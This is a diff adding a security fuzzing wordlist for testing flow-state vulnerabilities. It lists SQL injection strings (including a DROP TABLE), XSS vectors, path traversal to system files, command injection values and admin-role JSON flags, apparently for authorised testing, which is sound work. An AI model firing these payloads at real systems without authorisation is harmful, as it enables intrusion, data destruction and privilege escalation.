@@ -1,0 +1,76 @@
+# Flow Fuzzing Payloads
+# These payloads are designed to test flow state and cross-step vulnerabilities
+
+# Session/Token Manipulation
+admin
+user
+guest
+null
+undefined
+""
+''
+0
+-1
+999999999
+
+# SQL Injection for Flow State
+' OR '1'='1
+' OR 1=1--
+' UNION SELECT NULL--
+'; DROP TABLE users--
+
+# XSS for Flow State
+<script>alert('flow')</script>
+<img src=x onerror=alert('flow')>
+javascript:alert('flow')
+
+# Path Traversal for Flow State
+../../../etc/passwd
+..\..\..\windows\system32\drivers\etc\hosts
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Command Injection for Flow State
+| whoami
+; ls -la
+`id`
+$(whoami)
+
+# JSON Injection for Flow State
+{"admin": true}
+{"role": "admin"}
+{"authenticated": true}
+{"userId": 1}
+
+# Base64 Encoded Payloads
+YWRtaW4=  # admin
+dXNlcg==  # user
+Z3Vlc3Q=  # guest
+
+# URL Encoded Payloads
+%61%64%6d%69%6e  # admin
+%75%73%65%72     # user
+%67%75%65%73%74  # guest
+
+# Special Characters for Flow Testing
+<>
+"'
+{}
+[]
+()
+&
+|
+;
+`
+$
+@
+#
+%
+^
+*
++
+=
+~
+!
+?
+/
+\ 
